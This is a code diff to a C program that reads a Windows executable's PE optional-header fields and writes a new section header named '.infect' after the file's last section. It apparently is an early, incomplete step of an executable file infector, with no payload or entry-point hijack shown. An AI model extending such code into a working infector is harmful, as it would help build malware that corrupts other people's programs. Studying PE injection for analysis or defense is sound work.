@@ -39,15 +39,26 @@ int main(int argc, char *argv[]) {
 	// 0x20B => 64-bit
 	imageOptionalHeader.Magic = getval(fr, dw, SEEK_SET, ioh_addr);
 
-	// Increase SizeOfImage
+	imageOptionalHeader.AddressOfEntryPoint =
+		getval(fr, dd, SEEK_SET, ioh_addr+16);
+	imageOptionalHeader.ImageBase =
+		getval(fr,dd, SEEK_SET, ioh_addr+28);
+	imageOptionalHeader.SectionAlignment =
+		getval(fr, dd, SEEK_SET, ioh_addr+32);
+	imageOptionalHeader.FileAlignment =
+		getval(fr, dd, SEEK_SET, ioh_addr+36);
+	// TO-DO: Increase SizeOfImage
 	imageOptionalHeader.SizeOfImage =
 		getval(fr, dd, SEEK_SET,ioh_addr + 56);
 
-	DWORD ish_addr = ioh_addr + imageFileHeader.SizeOfOptionalHeader
-		+ 40 * imageFileHeader.NumberOfSections;
+	DWORD lastish_addr = ioh_addr + imageFileHeader.SizeOfOptionalHeader
+		+ 40 * (imageFileHeader.NumberOfSections-1);
 
+	DWORD newish_addr = lastish_addr + 40;
+
+	// Section Header
 	// Name
-	setval_char(fr, ".infect",8, SEEK_SET, ish_addr);
+	setval_char(fr, ".infect",8, SEEK_SET, newish_addr);
 	// VirtualSize
 	setval_int(fr, 0, dd, SEEK_CUR, 0);
 	// VirtualAddress
@@ -66,6 +77,8 @@ int main(int argc, char *argv[]) {
 	setval_int(fr, 0, dd, SEEK_CUR, 0);
 	// Characteristics
 	setval_int(fr, 0, dd, SEEK_CUR, 0);
+
+
 
 	end(fr, 0);
 }
